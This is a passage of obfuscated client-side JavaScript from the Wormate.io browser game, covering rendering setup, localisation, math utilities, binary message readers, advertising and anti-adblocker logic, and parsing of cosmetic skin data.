      _0x7f096e.d.getElementById("error-view").style.display = "block";
      return;
    }
    ;
    _0x4ead11.f = {
      g: function (_0x5c8b53, _0x38374b, _0x173564) {
        _0x5c8b53.stop();
        _0x5c8b53.fadeIn(_0x38374b, _0x173564);
      },
      h: function (_0x20329d, _0x44ea68, _0x31e437) {
        _0x20329d.stop();
        _0x20329d.fadeOut(_0x44ea68, _0x31e437);
      }
    };
    _0x4ead11.i = _0x331039.b("WebSocket");
    _0x4ead11.j = _0x331039.b("Float32Array");
    _0x2f6cdd = (_0x592e56 = _0x331039.b("PIXI")).BLEND_MODES;
    _0x1b052 = _0x592e56.WRAP_MODES;
    _0x4ead11.k = {
      l: _0x592e56.Container,
      m: _0x592e56.BaseTexture,
      n: _0x592e56.Texture,
      o: _0x592e56.Renderer,
      p: _0x592e56.Graphics,
      q: _0x592e56.Shader,
      r: _0x592e56.Rectangle,
      s: _0x592e56.Sprite,
      t: _0x592e56.Text,
      u: _0x592e56.Geometry,
      v: _0x592e56.Mesh,
      w: {
        z: _0x2f6cdd.ADD,
        A: _0x2f6cdd.SCREEN,
        B: _0x2f6cdd.MULTIPLY
      },
      C: {
        D: _0x1b052.REPEAT
      },
      F: {
        G: function (_0x4df797) {
          var _0x4c03a2 = _0x4df797.parent;
          if (_0x4c03a2 != null) {
            _0x4c03a2.removeChild(_0x4df797);
          }
        }
      }
    };
    _0x494ea6.H = {
      I: _0x7f096e.c.runtimeHash,
      J: "https://gateway.wormate.io",
      K: "https://resources.wormate.io",
      L: "/images/linelogo-valday2024.png",
      M: "/images/guest-avatar-valday2024.png",
      N: "/images/confetti-valday2024.png",
      O: "/images/bg-event-pattern-valday2025.png"
    };
    _0x494ea6.H.P = ((_0x499ff4 = _0x7f096e.c.I18N_LANG) || (_0x499ff4 = "en"), _0x499ff4);
    _0x494ea6.H.Q = function () {
      var _0x46ba72;
      switch (_0x494ea6.H.P) {
        case "uk":
          _0x46ba72 = "uk_UA";
          break;
        case "de":
          _0x46ba72 = "de_DE";
          break;
        case "fr":
          _0x46ba72 = "fr_FR";
          break;
        case "es":
          _0x46ba72 = "es_ES";
          break;
        default:
          _0x46ba72 = "en_US";
      }
      ;
      return _0x46ba72;
    }();
    moment.locale(_0x494ea6.H.Q);
    ooo = null;
    _0x494ea6.S = 6.283185307179586;
    _0x494ea6.T = 3.141592653589793;
    _0x44dc82 = _0x7f096e.c.I18N_MESSAGES;
    _0x331039.U = function (_0x5e5e4e) {
      return _0x44dc82[_0x5e5e4e];
    };
    _0x331039.V = function (_0x310700) {
      if (_0x310700[_0x494ea6.H.P]) {
        return _0x310700[_0x494ea6.H.P];
      } else if (_0x310700.en) {
        return _0x310700.en;
      } else {
        return _0x310700.x;
      }
    };
    _0x331039.W = function (_0x16595d) {
      return encodeURI(_0x16595d);
    };
    _0x331039.X = function (_0x2da126, _0x496e39) {
      return setInterval(_0x2da126, _0x496e39);
    };
    _0x331039.Y = function (_0x20b246, _0xe5eca8) {
      return setTimeout(_0x20b246, _0xe5eca8);
    };
    _0x331039.Z = function (_0x348892) {
      clearTimeout(_0x348892);
    };
    _0x331039.$ = function (_0x125fc3) {
      var _0x16c59a = (_0x331039._(_0x125fc3) % 60).toString();
      var _0x1e3c03 = (_0x331039._(_0x125fc3 / 60) % 60).toString();
      var _0x792aa3 = (_0x331039._(_0x125fc3 / 3600) % 24).toString();
      var _0x464f26 = _0x331039._(_0x125fc3 / 86400).toString();
      var _0x26e2b6 = _0x331039.U("util.time.days");
      var _0x595a79 = _0x331039.U("util.time.hours");
      var _0x196d59 = _0x331039.U("util.time.min");
      var _0xd4cf5b = _0x331039.U("util.time.sec");
      if (_0x464f26 > 0) {
        return _0x464f26 + " " + _0x26e2b6 + " " + _0x792aa3 + " " + _0x595a79 + " " + _0x1e3c03 + " " + _0x196d59 + " " + _0x16c59a + " " + _0xd4cf5b;
      } else if (_0x792aa3 > 0) {
        return _0x792aa3 + " " + _0x595a79 + " " + _0x1e3c03 + " " + _0x196d59 + " " + _0x16c59a + " " + _0xd4cf5b;
      } else if (_0x1e3c03 > 0) {
        return _0x1e3c03 + " " + _0x196d59 + " " + _0x16c59a + " " + _0xd4cf5b;
      } else {
        return _0x16c59a + " " + _0xd4cf5b;
      }
    };
    _0x331039.aa = function (_0x3b32a6) {
      if (_0x3b32a6.includes("href")) {
        return _0x3b32a6.replaceAll("href", "target=\"_black\" href");
      } else {
        return _0x3b32a6;
      }
    };
    _0x331039.ba = function (_0x53aa72, _0x28d0bd, _0x11cd0d) {
      var _0x4b4f7f = _0x7f096e.d.createElement("script");
      var _0x169abe = true;
      if (_typeof(_0x28d0bd) !== "undefined" && _0x28d0bd !== null) {
        if (_typeof(_0x28d0bd.id) !== "undefined") {
          _0x4b4f7f.id = _0x28d0bd.id;
        }
        if (_typeof(_0x28d0bd.async) !== "undefined" && _0x28d0bd.async) {
          _0x4b4f7f.async = "async";
        }
        if (_typeof(_0x28d0bd.defer) !== "undefined" && _0x28d0bd.defer) {
          _0x4b4f7f.defer = "defer";
        }
        if (_typeof(_0x28d0bd.crossorigin) !== "undefined") {
          _0x4b4f7f.crossorigin = _0x28d0bd.crossorigin;
        }
      }
      _0x4b4f7f.type = "text/javascript";
      _0x4b4f7f.src = _0x53aa72;
      if (_0x11cd0d) {
        _0x4b4f7f.onload = _0x4b4f7f.onreadystatechange = function () {
          _0x169abe = false;
          try {
            _0x11cd0d();
          } catch (_0x292b0c) {}
          ;
          _0x4b4f7f.onload = _0x4b4f7f.onreadystatechange = null;
        };
      }
      (_0x7f096e.d.head || _0x7f096e.d.getElementsByTagName("head")[0]).appendChild(_0x4b4f7f);
    };
    _0x331039.ca = function (_0x550794, _0xd14a1) {
      var _0x42f9b7 = _0xd14a1;
      _0x42f9b7.prototype = Object.create(_0x550794.prototype);
      _0x42f9b7.prototype.constructor = _0x42f9b7;
      _0x42f9b7.parent = _0x550794;
      return _0x42f9b7;
    };
    _0x331039.da = function (_0x2458f1) {
      if ((_0x2458f1 %= _0x494ea6.S) < 0) {
        return _0x2458f1 + _0x494ea6.S;
      } else {
        return _0x2458f1;
      }
    };
    _0x331039.ea = function (_0x4f0e38, _0x213e3c, _0x3adeaa) {
      return _0x331039.fa(_0x3adeaa, _0x4f0e38, _0x213e3c);
    };
    _0x331039.fa = function (_0xa81321, _0x3e8539, _0x103f52) {
      if (_0xa81321 > _0x103f52) {
        return _0x103f52;
      } else if (_0xa81321 < _0x3e8539) {
        return _0x3e8539;
      } else if (Number.isFinite(_0xa81321)) {
        return _0xa81321;
      } else {
        return (_0x3e8539 + _0x103f52) * 0.5;
      }
    };
    _0x331039.ga = function (_0x52745e, _0x3e337d, _0x17584c, _0x57f367) {
      if (_0x3e337d > _0x52745e) {
        return _0x331039.ha(_0x3e337d, _0x52745e + _0x17584c * _0x57f367);
      } else {
        return _0x331039.ia(_0x3e337d, _0x52745e - _0x17584c * _0x57f367);
      }
    };
    _0x331039.ja = function (_0x3698fc, _0x1e9eab, _0x2f5550, _0x4badb7, _0x53ffe8) {
      return _0x1e9eab + (_0x3698fc - _0x1e9eab) * Math.pow(1 - _0x4badb7, _0x2f5550 / _0x53ffe8);
    };
    _0x331039.ka = function (_0x578f76, _0x3f699a, _0x532006) {
      return _0x578f76 - (_0x578f76 - _0x3f699a) * _0x532006;
    };
    _0x331039.la = function (_0x513a81, _0x25c602) {
      return Math.sqrt(_0x513a81 * _0x513a81 + _0x25c602 * _0x25c602);
    };
    _0x331039.ma = function () {
      return Math.random();
    };
    _0x331039._ = function (_0x133b7e) {
      return Math.floor(_0x133b7e);
    };
    _0x331039.na = function (_0x426f40) {
      return Math.abs(_0x426f40);
    };
    _0x331039.ha = function (_0x512ef7, _0x525d39) {
      return Math.min(_0x512ef7, _0x525d39);
    };
    _0x331039.ia = function (_0x314530, _0x35eccc) {
      return Math.max(_0x314530, _0x35eccc);
    };
    _0x331039.oa = function (_0x2262aa) {
      return Math.sin(_0x2262aa);
    };
    _0x331039.pa = function (_0x276231) {
      return Math.cos(_0x276231);
    };
    _0x331039.qa = function (_0x5d28a5) {
      return Math.sqrt(_0x5d28a5);
    };
    _0x331039.ra = function (_0x2a45b5, _0x5026f5) {
      return Math.pow(_0x2a45b5, _0x5026f5);
    };
    _0x331039.sa = function (_0x3e8210) {
      return Math.atan(_0x3e8210);
    };
    _0x331039.ta = function (_0x3b790f, _0x5c79da) {
      return Math.atan2(_0x3b790f, _0x5c79da);
    };
    _0x331039.ua = function (_0x2cff67, _0xa82d16, _0x269e5f, _0x15d866) {
      var _0x2c2da2 = _0xa82d16 + _0x15d866;
      if (_0x2cff67 == null) {
        throw TypeError();
      }
      ;
      var _0x7acebd = _0x2cff67.length >>> 0;
      var _0x198c2e = _0x269e5f >> 0;
      var _0x26eb07 = _0x198c2e < 0 ? Math.max(_0x7acebd + _0x198c2e, 0) : Math.min(_0x198c2e, _0x7acebd);
      var _0x17eee8 = _0xa82d16 >> 0;
      var _0x4fd1fb = _0x17eee8 < 0 ? Math.max(_0x7acebd + _0x17eee8, 0) : Math.min(_0x17eee8, _0x7acebd);
      var _0x1da29e = _0x2c2da2 === undefined ? _0x7acebd : _0x2c2da2 >> 0;
      var _0x5ccf21 = Math.min((_0x1da29e < 0 ? Math.max(_0x7acebd + _0x1da29e, 0) : Math.min(_0x1da29e, _0x7acebd)) - _0x4fd1fb, _0x7acebd - _0x26eb07);
      var _0x59b00a = 1;
      for (_0x4fd1fb < _0x26eb07 && _0x26eb07 < _0x4fd1fb + _0x5ccf21 && (_0x59b00a = -1, _0x4fd1fb += _0x5ccf21 - 1, _0x26eb07 += _0x5ccf21 - 1); _0x5ccf21 > 0;) {
        if (_0x4fd1fb in _0x2cff67) {
          _0x2cff67[_0x26eb07] = _0x2cff67[_0x4fd1fb];
        } else {
          delete _0x2cff67[_0x26eb07];
        }
        _0x4fd1fb += _0x59b00a;
        _0x26eb07 += _0x59b00a;
        _0x5ccf21--;
      }
      ;
      return _0x2cff67;
    };
    _0x331039.va = function (_0x88b802, _0x5668f6) {
      return _0x88b802 + (_0x5668f6 - _0x88b802) * _0x331039.ma();
    };
    _0x331039.wa = function (_0x22d1f3) {
      return _0x22d1f3[parseInt(_0x331039.ma() * _0x22d1f3.length)];
    };
    _0x2a8027 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"].map(function (_0x12db0c) {
      return _0x12db0c.charCodeAt(0);
    });
    _0x331039.xa = function (_0x2c452b) {
      if (_typeof(_0x2c452b) == "undefined") {
        _0x2c452b = 16;
      }
      var _0x538883 = "";
      for (var _0x269e8f = 0; _0x269e8f < _0x2c452b; _0x269e8f++) {
        _0x538883 += String.fromCharCode(_0x2a8027[_0x331039._(_0x331039.ma() * _0x2a8027.length)]);
      }
      ;
      return _0x538883;
    };
    _0x331039.ya = function (_0xd9bd85, _0x101ca1, _0x9cdead) {
      var _0xd69a7f = _0x9cdead * (1 - _0x101ca1 * 0.5);
      var _0x2f5041 = Math.min(_0xd69a7f, 1 - _0xd69a7f);
      return _0x331039.za(_0xd9bd85, _0x2f5041 ? (_0x9cdead - _0xd69a7f) / _0x2f5041 : 0, _0xd69a7f);
    };
    _0x331039.za = function (_0x1a2ca0, _0x37f9b2, _0x43a932) {
      var _0x5c6dd1 = (1 - _0x331039.na(_0x43a932 * 2 - 1)) * _0x37f9b2;
      var _0x4ad33e = _0x5c6dd1 * (1 - _0x331039.na(_0x1a2ca0 / 60 % 2 - 1));
      var _0x54b9f1 = _0x43a932 - _0x5c6dd1 / 2;
      if (_0x1a2ca0 >= 0 && _0x1a2ca0 < 60) {
        return [_0x54b9f1 + _0x5c6dd1, _0x54b9f1 + _0x4ad33e, _0x54b9f1];
      } else if (_0x1a2ca0 >= 60 && _0x1a2ca0 < 120) {
        return [_0x54b9f1 + _0x4ad33e, _0x54b9f1 + _0x5c6dd1, _0x54b9f1];
      } else if (_0x1a2ca0 >= 120 && _0x1a2ca0 < 180) {
        return [_0x54b9f1, _0x54b9f1 + _0x5c6dd1, _0x54b9f1 + _0x4ad33e];
      } else if (_0x1a2ca0 >= 180 && _0x1a2ca0 < 240) {
        return [_0x54b9f1, _0x54b9f1 + _0x4ad33e, _0x54b9f1 + _0x5c6dd1];
      } else if (_0x1a2ca0 >= 240 && _0x1a2ca0 < 300) {
        return [_0x54b9f1 + _0x4ad33e, _0x54b9f1, _0x54b9f1 + _0x5c6dd1];
      } else {
        return [_0x54b9f1 + _0x5c6dd1, _0x54b9f1, _0x54b9f1 + _0x4ad33e];
      }
    };
    _0x331039.Aa = function (_0x2d399b, _0x5a2ea7, _0x473b3c) {
      $.get(_0x2d399b).fail(_0x5a2ea7).done(_0x473b3c);
    };
    _0x331039.Ba = function (_0x370deb, _0x542389, _0xef1fb4, _0x2a39f3) {
      var _0x44325d = {
        type: "GET",
        url: _0x370deb
      };
      var _0x205025 = {
        responseType: "arraybuffer"
      };
      _0x205025.onprogress = function (_0xcdb52e) {
        if (_0xcdb52e.lengthComputable) {
          _0x2a39f3(_0xcdb52e.loaded / _0xcdb52e.total * 100);
        }
      };
      _0x44325d.xhrFields = _0x205025;
      $.ajax(_0x44325d).fail(_0x542389).done(_0xef1fb4);
    };
    _0x331039.Ca = function () {
      return Date.now();
    };
    _0x331039.Da = function (_0x2137d3, _0x3ad251) {
      for (var _0x3c7cad in _0x2137d3) {
        if (_0x2137d3.hasOwnProperty(_0x3c7cad)) {
          _0x3ad251(_0x3c7cad, _0x2137d3[_0x3c7cad]);
        }
      }
    };
    _0x331039.Ea = function (_0x58d7d3) {
      for (var _0x28c0f2 = _0x58d7d3.length - 1; _0x28c0f2 > 0; _0x28c0f2--) {
        var _0x13a71b = _0x331039._(_0x331039.ma() * (_0x28c0f2 + 1));
        var _0x56d8cc = _0x58d7d3[_0x28c0f2];
        _0x58d7d3[_0x28c0f2] = _0x58d7d3[_0x13a71b];
        _0x58d7d3[_0x13a71b] = _0x56d8cc;
      }
      ;
      return _0x58d7d3;
    };
    _0x7f096e.Fa = _0x331039.b("ArrayBuffer");
    _0x7f096e.Ga = _0x331039.b("DataView");
    _0x7f096e.Ha = function () {
      function _0xcd1280(_0x44d034) {
        this.Ia = _0x44d034;
        this.Ja = 0;
      }
      var _0x528f3f = "getInt8";
      _0xcd1280.prototype.Ka = function () {
        var _0x4a2c0f = this.Ia[_0x528f3f](this.Ja);
        this.Ja += 1;
        return _0x4a2c0f;
      };
      var _0x1d8bf0 = "getInt16";
      _0xcd1280.prototype.La = function () {
        var _0x5c3876 = this.Ia[_0x1d8bf0](this.Ja);
        this.Ja += 2;
        return _0x5c3876;
      };
      var _0x4be223 = "getInt32";
      _0xcd1280.prototype.Ma = function () {
        var _0x10a963 = this.Ia[_0x4be223](this.Ja);
        this.Ja += 4;
        return _0x10a963;
      };
      var _0x14155b = "getFloat32";
      _0xcd1280.prototype.Na = function () {
        var _0x29c903 = this.Ia[_0x14155b](this.Ja);
        this.Ja += 4;
        return _0x29c903;
      };
      return _0xcd1280;
    }();
    _0x7f096e.Oa = function () {
      function _0x439f68(_0x5fc25e) {
        this.Ia = _0x5fc25e;
        this.Ja = 0;
      }
      var _0x452383 = "setInt8";
      _0x439f68.prototype.Pa = function (_0x36468b) {
        this.Ia[_0x452383](this.Ja, _0x36468b);
        this.Ja += 1;
      };
      var _0x5ce192 = "setInt16";
      _0x439f68.prototype.Qa = function (_0x46e172) {
        this.Ia[_0x5ce192](this.Ja, _0x46e172);
        this.Ja += 2;
      };
      return _0x439f68;
    }();
    _0x331039.Ra = function () {
      var _0x4f0bea = false;
      function _0x3c163a() {}
      var _0x515c64 = {};
      var _0x407659 = "1eaom01c3pxu9wd3";
      var _0x4789b1 = $("#" + _0x407659);
      var _0x8a774a = "JDHnkHtYwyXyVgG9";
      var _0x3f61bf = $("#" + _0x8a774a);
      $("#adbl-continue").click(function () {
        _0x3f61bf.fadeOut(500);
        _0x3c163a(false);
      });
      _0x515c64.Sa = function (_0x337092) {
        _0x3c163a = _0x337092;
        if (!_0x4f0bea) {
          try {
            aiptag.cmd.player.push(function () {
              var _0x4ade8d = {
                AD_WIDTH: 960,
                AD_HEIGHT: 540,
                AD_FULLSCREEN: true,
                AD_CENTERPLAYER: false
              };
              _0x4ade8d.LOADING_TEXT = "loading advertisement";
              _0x4ade8d.PREROLL_ELEM = function () {
                return _0x7f096e.d.getElementById(_0x407659);
              };
              _0x4ade8d.AIP_COMPLETE = function (_0x33f130) {
                _0x3c163a(true);
                _0x4ead11.f.h(_0x4789b1, 1);
                _0x4ead11.f.h(_0x3f61bf, 1);
                try {
                  ga("send", "event", "preroll", _0x494ea6.H.I + "_complete");
                } catch (_0x277838) {}
              };
              _0x4ade8d.AIP_REMOVE = function () {};
              aiptag.adplayer = new aipPlayer(_0x4ade8d);
            });
            _0x4f0bea = true;
          } catch (_0x260781) {}
        }
      };
      _0x515c64.Ta = function () {
        if (_typeof(aiptag.adplayer) !== "undefined") {
          try {
            ga("send", "event", "preroll", _0x494ea6.H.I + "_request");
          } catch (_0x48977b) {}
          ;
          _0x4ead11.f.g(_0x4789b1, 1);
          if (!_0x5c2dcc.on) {
            aiptag.cmd.player.push(function () {
              aiptag.adplayer.startPreRoll();
            });
          }
        } else {
          try {
            ga("send", "event", "antiadblocker", _0x494ea6.H.I + "_start");
          } catch (_0x152e47) {}
          ;
          (function _0x118936() {
            $("#adbl-1").text(_0x331039.U("index.game.antiadblocker.msg1"));
            $("#adbl-2").text(_0x331039.U("index.game.antiadblocker.msg2"));
            $("#adbl-3").text(_0x331039.U("index.game.antiadblocker.msg3"));
            $("#adbl-4").text(_0x331039.U("index.game.antiadblocker.msg4").replace("{0}", 10));
            $("#adbl-continue span").text(_0x331039.U("index.game.antiadblocker.continue"));
            _0x4ead11.f.h($("#adbl-continue"), 1);
            _0x4ead11.f.g(_0x3f61bf, 500);
            var _0x53a077 = 10;
            for (var _0x127fc7 = 0; _0x127fc7 < 10; _0x127fc7++) {
              _0x331039.Y(function () {
                _0x53a077--;
                $("#adbl-4").text(_0x331039.U("index.game.antiadblocker.msg4").replace("{0}", _0x53a077));
                if (_0x53a077 === 0) {
                  try {
                    ga("send", "event", "antiadblocker", _0x494ea6.H.I + "_complete");
                  } catch (_0x594c0c) {}
                  ;
                  _0x4ead11.f.g($("#adbl-continue"), 200);
                }
              }, (_0x127fc7 + 1) * 1000);
            }
          })();
        }
      };
      return _0x515c64;
    };
    _0x331039.Ua = function (_0x56583a, _0x384013) {
      var _0x3b1ab4 = $("#" + _0x56583a);
      var _0x2b9815 = _0x384013;
      var _0x59e7a4 = {};
      var _0x6f43d3 = false;
      _0x59e7a4.Sa = function () {
        if (!_0x6f43d3) {
          _0x3b1ab4.empty();
          _0x3b1ab4.append("<div id='" + _0x2b9815 + "'></div>");
          try {
            try {
              ga("send", "event", "banner", _0x494ea6.H.I + "_display");
            } catch (_0x3026a6) {}
            ;
            if (!_0x5c2dcc.on) {
              aiptag.cmd.display.push(function () {
                aipDisplayTag.display(_0x2b9815);
              });
            }
            _0x6f43d3 = true;
          } catch (_0xd38cc4) {}
        }
      };
      _0x59e7a4.Va = function () {
        try {
          try {
            ga("send", "event", "banner", _0x494ea6.H.I + "_refresh");
          } catch (_0x1a8e80) {}
          ;
          if (!_0x5c2dcc.on) {
            aiptag.cmd.display.push(function () {
              aipDisplayTag.display(_0x2b9815);
            });
          }
        } catch (_0x125424) {}
      };
      return _0x59e7a4;
    };
    _0x7f096e.Wa = function () {
      function _0x2e160e(_0x363f35, _0x365f5b, _0x48c978, _0x2724bb, _0xe0545, _0x2f3063, _0x1b7534, _0x2dec14, _0x44a8a1, _0x1715be) {
        this.Xa = _0x363f35;
        this.Ya = _0x365f5b;
        this.Za = null;
        this.$a = false;
        this._a = _0x48c978;
        this.ab = _0x2724bb;
        this.bb = _0xe0545;
        this.cb = _0x2f3063;
        this.db = _0x1b7534 || (_0x44a8a1 || _0xe0545) / 2;
        this.eb = _0x2dec14 || (_0x1715be || _0x2f3063) / 2;
        this.fb = _0x44a8a1 || _0xe0545;
        this.gb = _0x1715be || _0x2f3063;
        this.hb = 0.5 - (this.db - this.fb * 0.5) / this.bb;
        this.ib = 0.5 - (this.eb - this.gb * 0.5) / this.cb;
        this.jb = this.bb / this.fb;
        this.kb = this.cb / this.gb;
      }
      _0x2e160e.lb = function () {
        return new _0x2e160e("", null, 0, 0, 0, 0, 0, 0, 0, 0);
      };
      _0x2e160e.mb = function (_0x14507c, _0x2d13bd, _0x5d94a4) {
        return new _0x2e160e(_0x14507c, _0x2d13bd, _0x5d94a4.x, _0x5d94a4.y, _0x5d94a4.w, _0x5d94a4.h, _0x5d94a4.px, _0x5d94a4.py, _0x5d94a4.pw, _0x5d94a4.ph);
      };
      _0x2e160e.prototype.nb = function () {
        if (!this.$a) {
          if (this.Ya != null) {
            this.Za = new _0x4ead11.k.n(this.Ya, new _0x4ead11.k.r(this._a, this.ab, this.bb, this.cb));
          }
          this.$a = true;
        }
        return this.Za;
      };
      _0x2e160e.prototype.ob = function () {
        if (this.Za != null) {
          this.Za.destroy();
        }
      };
      return _0x2e160e;
    }();
    _0x7f096e.pb = function () {
      function _0x3592c0(_0x25b95d, _0x42ba8e, _0x14e0a9, _0x4b96f9, _0x51dbcf, _0x498e60, _0x3c194d, _0x13d456, _0x3ee565, _0x556d63, _0x3aaf2d, _0x14dcde, _0xf57269, _0x1bf885, _0x24f835, _0x3fd9a8, _0x352f1e, _0x46389c) {
        this.qb = _0x25b95d;
        this.rb = _0x42ba8e;
        this.sb = _0x14e0a9;
        this.tb = _0x4b96f9;
        this.ub = _0x51dbcf;
        this.vb = _0x498e60;
        this.wb = _0x3c194d;
        this.xb = _0x13d456;
        this.yb = _0x3ee565;
        this.zb = _0x556d63;
        this.Ab = _0x3aaf2d;
        this.Bb = _0x14dcde;
        this.Cb = _0xf57269;
        this.Db = _0x1bf885;
        this.Eb = _0x24f835;
        this.Fb = _0x3fd9a8;
        this.Gb = _0x352f1e;
        this.Hb = _0x46389c;
      }
      _0x3592c0.prototype.ob = function () {
        for (var _0x1a8d9f = 0; _0x1a8d9f < this.qb.length; _0x1a8d9f++) {
          this.qb[_0x1a8d9f].dispose();
          this.qb[_0x1a8d9f].destroy();
        }
        ;
        this.qb = [];
        for (var _0x4897c2 = 0; _0x4897c2 < this.rb.length; _0x4897c2++) {
          this.rb[_0x4897c2].ob();
        }
        ;
        this.rb = [];
      };
      _0x3592c0.lb = function () {
        var _0x492d95 = new _0x3592c0.Ib(_0x7f096e.Kb.Jb, _0x7f096e.Kb.Jb);
        var _0x549280 = new _0x3592c0.Lb("#ffffff", [_0x7f096e.Kb.Jb], [_0x7f096e.Kb.Jb]);
        return new _0x3592c0([], [], {}, _0x492d95, {}, new _0x3592c0.Mb(_0x7f096e.Kb.Jb), {}, _0x549280, {}, new _0x3592c0.Nb("", _0x549280, _0x492d95), {}, new _0x3592c0.Ob([_0x7f096e.Kb.Jb]), {}, new _0x3592c0.Ob([_0x7f096e.Kb.Jb]), {}, new _0x3592c0.Ob([_0x7f096e.Kb.Jb]), {}, new _0x3592c0.Ob([_0x7f096e.Kb.Jb]));
      };
      _0x3592c0.Pb = function (_0x590753, _0x372d32, _0x4b628b, _0x443441) {
        var _0x4617fc = new _0x3592c0.Ib(_0x7f096e.Kb.Jb, _0x7f096e.Kb.Jb);
        var _0x1bd19a = new _0x3592c0.Lb("#ffffff", [_0x590753], [_0x372d32]);
        return new _0x3592c0([], [], {}, _0x4617fc, {}, new _0x3592c0.Mb(_0x7f096e.Kb.Jb), {}, _0x1bd19a, {}, new _0x3592c0.Nb("", _0x1bd19a, _0x4617fc), {}, new _0x3592c0.Ob([_0x4b628b]), {}, new _0x3592c0.Ob([_0x443441]), {}, new _0x3592c0.Ob([_0x7f096e.Kb.Jb]), {}, new _0x3592c0.Ob([_0x7f096e.Kb.Jb]));
      };
      _0x3592c0.Qb = function (_0x18784a, _0x1c8de1, _0x4b3a23, _0x4ba86b) {
        var _0x35612c = {};
        _0x331039.Da(_0x18784a.colorDict, function (_0x33ddc9, _0x27ed53) {
          _0x35612c[_0x33ddc9] = "#" + _0x27ed53;
        });
        var _0x50064f = {};
        for (var _0x1bcae3 = 0; _0x1bcae3 < _0x18784a.skinArrayDict.length; _0x1bcae3++) {
          var _0xdda7c5 = _0x18784a.skinArrayDict[_0x1bcae3];
          _0x50064f[_0xdda7c5.id] = new _0x3592c0.Lb(_0x35612c[_0xdda7c5.prime], _0xdda7c5.base.map(function (_0x22ce1a) {
            return _0x1c8de1[_0x22ce1a];
          }), _0xdda7c5.glow.map(function (_0x5a4560) {
            return _0x1c8de1[_0x5a4560];
          }));
        }
        ;
        var _0x34eaf3;
        var _0x34a012 = _0x18784a.skinUnknown;
        _0x34eaf3 = new _0x3592c0.Lb(_0x35612c[_0x34a012.prime], _0x34a012.base.map(function (_0x53b372) {
          return _0x1c8de1[_0x53b372];
        }), _0x34a012.glow.map(function (_0x4659ac) {
          return _0x1c8de1[_0x4659ac];
        }));
        var _0xbd89c9 = {};
        _0x331039.Da(_0x18784a.eyesDict, function (_0x394a90, _0x2f04b3) {
          _0xbd89c9[parseInt(_0x394a90)] = new _0x3592c0.Ob(_0x2f04b3.base.map(function (_0x8553f1) {
            return _0x1c8de1[_0x8553f1.region];
          }));
        });
        var _0x3b8c41 = new _0x3592c0.Ob(_0x18784a.eyesUnknown.base.map(function (_0x2e468f) {
          return _0x1c8de1[_0x2e468f.region];
        }));
        var _0x3c58ec = {};
        _0x331039.Da(_0x18784a.mouthDict, function (_0x2a3527, _0x131b6e) {
          _0x3c58ec[parseInt(_0x2a3527)] = new _0x3592c0.Ob(_0x131b6e.base.map(function (_0x21edf8) {
            return _0x1c8de1[_0x21edf8.region];
          }));
        });
        var _0x458a57 = new _0x3592c0.Ob(_0x18784a.mouthUnknown.base.map(function (_0x1aa82a) {
          return _0x1c8de1[_0x1aa82a.region];
        }));
        var _0x4f2220 = {};
        _0x331039.Da(_0x18784a.hatDict, function (_0x1a28a5, _0x4e9610) {
          _0x4f2220[parseInt(_0x1a28a5)] = new _0x3592c0.Ob(_0x4e9610.base.map(function (_0x13ae7a) {
            return _0x1c8de1[_0x13ae7a.region];
          }));
        });
        var _0x4b7d7b = new _0x3592c0.Ob(_0x18784a.hatUnknown.base.map(function (_0x3d3503) {
          return _0x1c8de1[_0x3d3503.region];
        }));
        var _0x4c9d5e = {};
        _0x331039.Da(_0x18784a.glassesDict, function (_0x582f6c, _0x3b0e96) {
          _0x4c9d5e[parseInt(_0x582f6c)] = new _0x3592c0.Ob(_0x3b0e96.base.map(function (_0x2555c8) {
            return _0x1c8de1[_0x2555c8.region];
          }));
        });
        var _0x5a366f = new _0x3592c0.Ob(_0x18784a.glassesUnknown.base.map(function (_0x124097) {
          return _0x1c8de1[_0x124097.region];
        }));
        var _0x10bd22 = {};
        _0x331039.Da(_0x18784a.portionDict, function (_0x1907ff, _0x212fa8) {
          _0x10bd22[_0x1907ff = parseInt(_0x1907ff)] = new _0x3592c0.Ib(_0x1c8de1[_0x212fa8.base], _0x1c8de1[_0x212fa8.glow]);
        });
        var _0x127e2e;
        var _0x3e4565 = _0x18784a.portionUnknown;
        _0x127e2e = new _0x3592c0.Ib(_0x1c8de1[_0x3e4565.base], _0x1c8de1[_0x3e4565.glow]);
        var _0x39eca8 = {};
        _0x331039.Da(_0x18784a.abilityDict, function (_0x4d7468, _0x5d0f8c) {
          _0x39eca8[_0x4d7468 = parseInt(_0x4d7468)] = new _0x3592c0.Mb(_0x1c8de1[_0x5d0f8c.base]);
        });
        var _0x272ac3;
        var _0x96570 = _0x18784a.abilityUnknown;
        _0x272ac3 = new _0x3592c0.Mb(_0x1c8de1[_0x96570.base]);
        var _0x8dd207 = {};
        _0x331039.Da(_0x18784a.teamDict, function (_0x537eb7, _0x4624d7) {
          _0x8dd207[_0x537eb7 = parseInt(_0x537eb7)] = new _0x3592c0.Nb(_0x4624d7.title, new _0x3592c0.Lb(_0x35612c[_0x4624d7.skin.prime], null, _0x4624d7.skin.glow.map(function (_0x5d9abc) {
            return _0x1c8de1[_0x5d9abc];
          })), new _0x3592c0.Ib(null, _0x1c8de1[_0x4624d7.portion.glow]));
        });
        var _0x1d1c00 = new _0x3592c0.Nb({}, _0x34eaf3, _0x127e2e);
        return new _0x3592c0(_0x4b3a23, _0x4ba86b, _0x10bd22, _0x127e2e, _0x39eca8, _0x272ac3, _0x50064f, _0x34eaf3, _0x8dd207, _0x1d1c00, _0xbd89c9, _0x3b8c41, _0x3c58ec, _0x458a57, _0x4f2220, _0x4b7d7b, _0x4c9d5e, _0x5a366f);
      };
      _0x3592c0.prototype.Rb = function (_0x2c4789) {
        var _0x4b852b = _0x331039.Ea(Object.keys(this.wb)).slice(0, _0x2c4789);
        var _0x36e76c = _0x331039.Ea(Object.keys(this.Ab)).slice(0, _0x2c4789);
        var _0x4c43f1 = _0x331039.Ea(Object.keys(this.Cb)).slice(0, _0x2c4789);
        var _0x328573 = _0x331039.Ea(Object.keys(this.Eb)).slice(0, _0x2c4789);
        var _0x5921b6 = _0x331039.Ea(Object.keys(this.Gb)).slice(0, _0x2c4789);
        var _0x3de2ec = [];
        for (var _0x4d292f = 0; _0x4d292f < _0x2c4789; _0x4d292f++) {
          var _0xf46f7d = _0x4b852b.length > 0 ? _0x4b852b[_0x4d292f % _0x4b852b.length] : 0;
          var _0xff09f4 = _0x36e76c.length > 0 ? _0x36e76c[_0x4d292f % _0x36e76c.length] : 0;
